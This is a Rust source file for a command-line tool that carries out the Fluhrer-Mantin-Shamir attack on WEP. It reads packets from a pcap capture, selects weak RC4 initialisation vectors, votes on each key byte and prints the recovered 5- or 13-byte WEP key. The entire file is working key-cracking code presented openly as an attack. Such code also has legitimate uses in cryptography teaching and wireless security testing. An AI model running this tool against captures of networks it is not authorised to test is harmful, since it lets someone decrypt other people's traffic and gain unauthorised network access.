// this is not really needed but anyway
mod rc4;

use pcap_file::pcap::PcapReader;
use std::env::args;
use std::fs::File;
use std::path::Path;
use std::vec;

use hex;

fn possible_key_bit<T: AsRef<[u8]>>(key: T, byte: u8) -> u8 {
    let key = key.as_ref();
    let mut s = (0..=255_u8).collect::<Vec<u8>>();
    let mut j = 0;
    // KSA
    for i in 0..key.len() {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    let position = s.iter().position(|&x| x == byte).unwrap();

    (position - j - s[key.len() % 256] as usize % 256) as u8
}

fn attack(path: &str, key_size: usize) -> Vec<u8> {
    let mut key_guess = Vec::new();
    for a in 0..key_size {
        let mut num_of_resolved_packets = 0;
        let file = File::open(path).unwrap();
        let mut pcap_reader = PcapReader::new(file).unwrap();
        let mut counts = vec![0; 256];
        while let Some(pkt) = pcap_reader.next_packet() {
            // this 26 index depends on the file, im supposing that the pcap file
            // only captures from the data link layer onward, meaning the first
            // headers are 802.11 ones. no radiotap.
            let data = &pkt.unwrap().data[26..];
            let iv = data.get(..3).unwrap();
            if iv[0] == (a + 3) as u8 && iv[1] == 0xFF {
                num_of_resolved_packets += 1;
                // supposing here that we have iv + 0x00 then data (which is the
                // case from what ive seen)
                let byte = data.get(4).unwrap() ^ 0xAA;
                let key: Vec<u8> = vec![iv.to_vec(), key_guess.clone()]
                    .into_iter()
                    .flatten()
                    .collect();
                // do that weird formula thing
                let possible_next_key_value = possible_key_bit(&key, byte);
                counts[possible_next_key_value as usize] += 1;
            }
        }
        println!("number of useful packets = {num_of_resolved_packets}");
        // get the value that has the biggest count
        let value = counts.iter().max().unwrap();
        let position = counts.iter().position(|&x| x == *value).unwrap();
        key_guess.push(position as u8);
    }
    key_guess
}

fn usage() {
    println!("usage: fmsrs [path to pcap file] [key size (5 or 13)]");
}

fn main() {
    let args = args().collect::<Vec<String>>();
    let path: &str;
    let key_size: usize;
    if let (Some(arg1), Some(arg2)) = (args.get(1), args.get(2)) {
        (path, key_size) = match (
            Path::new(arg1).exists() && arg1.ends_with(".pcap"),
            arg2.parse(),
        ) {
            (true, Ok(5)) => (arg1, 5),
            (true, Ok(13)) => (arg1, 13),
            _ => {
                usage();
                return;
            }
        };
    } else {
        usage();
        return;
    }

    let key = attack(path, key_size);
    println!("--------------------------done---------------------------");
    println!(
        "recovered key:   {}\nin hex:          {}",
        String::from_utf8_lossy(&key),
        hex::encode(&key)
    );
}
